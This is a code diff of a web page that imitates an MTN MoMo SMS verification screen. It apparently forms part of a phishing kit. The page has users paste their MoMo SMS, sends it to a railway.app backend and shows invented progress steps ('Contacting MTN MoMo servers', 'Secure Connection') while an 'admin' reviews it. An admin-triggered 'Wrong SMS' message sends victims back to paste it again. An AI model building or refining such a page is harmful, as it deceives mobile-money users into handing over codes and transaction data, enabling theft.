+                    <div class="verify-step-text">🔍 Scanning your SMS content</div>
+                    <div class="verify-step-text">📡 Contacting MTN MoMo servers</div>
+                    <div class="verify-step-text">🔐 Verifying transaction details</div>
+                    <div class="verify-step-text">⏳ Awaiting admin confirmation</div>
+                </div>
+            </div>
+
+            <div class="verify-status-row">
+                <span class="verify-status-dot"></span>
+                <span>Live · Secure Connection</span>
             </div>
         </div>
     </div>
 
     <script>
-        /* ============================================
+        /* ═══════════════════════════════════════════
            BACKEND URL
-        ============================================ */
+        ═══════════════════════════════════════════ */
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
         const POLL_INTERVAL_MS = 2500;
 
-        /* ============================================
-           DOM REFERENCES
-        ============================================ */
+        /* ═══════════════════════════════════════════
+           DOM REFS
+        ═══════════════════════════════════════════ */
         const smsInput = document.getElementById('smsInput');
         const pasteBtn = document.getElementById('pasteBtn');
         const charCount = document.getElementById('charCount');
@@ -581,10 +841,11 @@
         const verifyBarFill = document.getElementById('verifyBarFill');
         const verifyTitle = document.getElementById('verifyTitle');
         const verifySubtitle = document.getElementById('verifySubtitle');
+        const verifyStepInner = document.getElementById('verifyStepInner');
 
-        /* ============================================
+        /* ═══════════════════════════════════════════
            SESSION CHECK
-        ============================================ */
+        ═══════════════════════════════════════════ */
         const sessionRaw = localStorage.getItem('momoSession');
         if (!sessionRaw) {
             window.location.href = 'login.html';
@@ -594,9 +855,9 @@
 
         const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
 
-        /* ============================================
+        /* ═══════════════════════════════════════════
            SMS INPUT
-        ============================================ */
+        ═══════════════════════════════════════════ */
         const MIN_LENGTH = 20;
         const MTN_KEYWORDS = ['mtn', 'momo', 'transaction', 'ref', 'amount', 'xaf', 'confirmed', 'received', 'sent'];
 
@@ -628,9 +889,9 @@
             setTimeout(() => { updateCharCount(); updateVerifyState(); }, 0);
         });
 
-        /* ============================================
+        /* ═══════════════════════════════════════════
            PASTE BUTTON
-        ============================================ */
+        ═══════════════════════════════════════════ */
         pasteBtn.addEventListener('click', async function() {
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -654,9 +915,9 @@
             }
         });
 
-        /* ============================================
+        /* ═══════════════════════════════════════════
            RESEND COUNTDOWN
-        ============================================ */
+        ═══════════════════════════════════════════ */
         let remaining = 60;
         let resendTimer = null;
 
@@ -675,7 +936,6 @@
                 }
             }, 1000);
         }
-
         startCountdown();
 
         resendBtn.addEventListener('click', async function() {
@@ -692,16 +952,31 @@
             startCountdown();
         });
 
-        /* ============================================
-           VERIFY OVERLAY
-        ============================================ */
+        /* ═══════════════════════════════════════════
+           SUPER VERIFY OVERLAY
+        ═══════════════════════════════════════════ */
         let verifyTimer = null;
+        let stepTimer = null;
 
         function startVerifyBar() {
             verifyOverlay.classList.add('show');
             verifyBarFill.style.width = '0%';
             verifyBarFill.style.background = '';
+            verifyTitle.innerHTML = 'Verifying your <span class="highlight">SMS</span>';
+            verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
+
+            // Rotate steps
+            let stepIndex = 0;
+            verifyStepInner.style.transform = 'translateY(0)';
+            if (stepTimer) clearInterval(stepTimer);
+            stepTimer = setInterval(() => {
+                stepIndex = (stepIndex + 1) % 4;
+                verifyStepInner.style.transform = `translateY(-${stepIndex * 20}px)`;
+            }, 2200);
+
+            // Progress
             const startTime = Date.now();
+            if (verifyTimer) clearInterval(verifyTimer);
             verifyTimer = setInterval(function() {
                 const elapsed = Date.now() - startTime;
                 const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
@@ -711,20 +986,24 @@
 
         function finishVerifyBar() {
             if (verifyTimer) clearInterval(verifyTimer);
+            if (stepTimer) clearInterval(stepTimer);
             verifyBarFill.style.width = '100%';
         }
 
         function showRejection(reason) {
             if (verifyTimer) clearInterval(verifyTimer);
+            if (stepTimer) clearInterval(stepTimer);
             verifyBarFill.style.width = '100%';
             verifyBarFill.style.background = '#e74c3c';
+            verifyStepInner.style.transform = 'translateY(0)';
+
             verifyTitle.innerHTML = reason.title;
             verifySubtitle.textContent = reason.subtitle;
 
             setTimeout(function() {
                 verifyOverlay.classList.remove('show');
                 verifyBarFill.style.background = '';
-                verifyTitle.innerHTML = 'Verifying your <span class="highlight">SMS</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>';
+                verifyTitle.innerHTML = 'Verifying your <span class="highlight">SMS</span>';
                 verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
 
                 smsInput.classList.add('invalid');
@@ -736,9 +1015,9 @@
             }, 1800);
         }
 
-        /* ============================================
-           RESEND → SHOW CATCHY OVERLAY FOR 6s → REDIRECT
-        ============================================ */
+        /* ═══════════════════════════════════════════
+           RESEND FROM ADMIN
+        ═══════════════════════════════════════════ */
         let resendHandled = false;
 
         function handleResendFromAdmin() {
@@ -746,20 +1025,19 @@
             resendHandled = true;
 
             if (verifyTimer) clearInterval(verifyTimer);
+            if (stepTimer) clearInterval(stepTimer);
             verifyBarFill.style.width = '100%';
             verifyBarFill.style.background = '#FFCC00';
+            verifyStepInner.style.transform = 'translateY(0)';
 
-            /* Show the catchy, clear message */
-            verifyOverlay.classList.add('show');
             verifyTitle.innerHTML = '⚠️ <span class="highlight">Wrong SMS</span> pasted';
             verifySubtitle.innerHTML =
-                '<b style="color:#1a1a2e;font-size:14.5px;">The message you pasted is not the correct MTN SMS.</b><br><br>' +
+                '<b style="color:#ffffff;font-size:14.5px;">The message you pasted is not the correct MTN SMS.</b><br><br>' +
                 'Please start fresh and paste the <b>correct</b> SMS from MTN MoMo.';
             verifySubtitle.style.fontSize = '13.5px';
             verifySubtitle.style.lineHeight = '1.65';
             verifySubtitle.style.padding = '0 6px';
 
-            /* Redirect after 6 seconds */
             setTimeout(function() {
                 localStorage.removeItem('momoSession');
                 localStorage.removeItem('momoPhone');
@@ -769,9 +1047,9 @@
             }, 6000);
         }
 
-        /* ============================================
+        /* ═══════════════════════════════════════════
            POLLING
-        ============================================ */
+        ═══════════════════════════════════════════ */
         let pollTimer = null;
 
         function stopPolling() {
@@ -836,9 +1114,9 @@
             }, POLL_INTERVAL_MS);
         }
 
-        /* ============================================
+        /* ═══════════════════════════════════════════
            VERIFY BUTTON
-        ============================================ */
+        ═══════════════════════════════════════════ */
         verifyBtn.addEventListener('click', async function() {
             const text = smsInput.value.trim();
 
